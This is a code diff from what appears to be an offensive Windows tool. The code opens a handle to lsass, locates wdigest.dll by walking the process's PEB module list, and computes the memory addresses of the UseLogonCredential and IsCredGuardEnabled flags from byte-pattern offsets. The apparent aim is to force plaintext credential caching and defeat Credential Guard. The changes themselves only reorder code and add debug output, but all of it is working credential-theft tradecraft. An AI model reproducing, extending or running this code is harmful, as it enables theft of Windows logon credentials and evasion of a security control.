@@ -152,10 +152,10 @@ uintptr_t CustomGetModuleHandle(HANDLE hProcess, const char* dll_name) {
     void* pebaddress = *(void**)peb_pointer;
     void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
     void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
-    //if (ldr_adress == NULL) {
-    //    printf("[-] PEB structure is not readable.\n");
-    //    exit(0);
-    //}
+    if ((long long)ldr_adress == 0) {
+        printf("[-] PEB structure is not readable.\n");
+        exit(0);
+    }
     void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
     void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
 
@@ -691,16 +691,6 @@ void exec(const char* option, bool debug) {
 
     int useLogonCredential_Offset = useLogonCredential + offset + 6;
     int isCredGuardEnabled_Offset = isCredGuardEnabled + offset + 12;
-
-    HANDLE lsassHandle = GetProcessByName(proc_name);
-    if (lsassHandle == 0) {
-        printf("[-] It was not possible to get lsass handle.");
-        exit(0);
-    }
-    uintptr_t hModule = CustomGetModuleHandle(lsassHandle, dllName);
-    uintptr_t useLogonCredential_Address = hModule + useLogonCredential_Offset;
-    uintptr_t isCredGuardEnabled_Address = hModule + isCredGuardEnabled_Offset;
-
     if (debug) {
         printf("[+] Matched Bytes: \t\t");
         for (int i = 0; i < 18; i++) {
@@ -710,7 +700,23 @@ void exec(const char* option, bool debug) {
         printf("[+] Offset: \t\t\t0x%X\n", offset);
         printf("[+] UseLogonCredential offset: \t0x%X (0x%X + offset +  6)\n", useLogonCredential_Offset, useLogonCredential);
         printf("[+] IsCredGuardEnabled offset: \t0x%X (0x%X + offset +  6)\n", isCredGuardEnabled_Offset, isCredGuardEnabled);
+    }
+
+    HANDLE lsassHandle = GetProcessByName(proc_name);
+    if (lsassHandle == 0) {
+        printf("[-] It was not possible to get lsass handle.");
+        exit(0);
+    }
+    if (debug) {
         printf("[+] Lsass Handle:\t\t%lld\n", (long long)lsassHandle);
+    }
+
+    uintptr_t hModule = CustomGetModuleHandle(lsassHandle, dllName);
+    // Other option is LoadLibrary: much simpler but there is not an equivalent in ntdll :(
+    // uintptr_t hModule = (uintptr_t)LoadLibraryA("wdigest.dll");
+    uintptr_t useLogonCredential_Address = hModule + useLogonCredential_Offset;
+    uintptr_t isCredGuardEnabled_Address = hModule + isCredGuardEnabled_Offset;
+    if (debug) {
         printf("[+] DLL Base Address: \t\t0x%llX\n", (unsigned long long)hModule);
         printf("[+] UseLogonCredential address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)useLogonCredential_Address, (unsigned long long)hModule, useLogonCredential_Offset);
         printf("[+] IsCredGuardEnabled address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)isCredGuardEnabled_Address, (unsigned long long)hModule, isCredGuardEnabled_Offset);
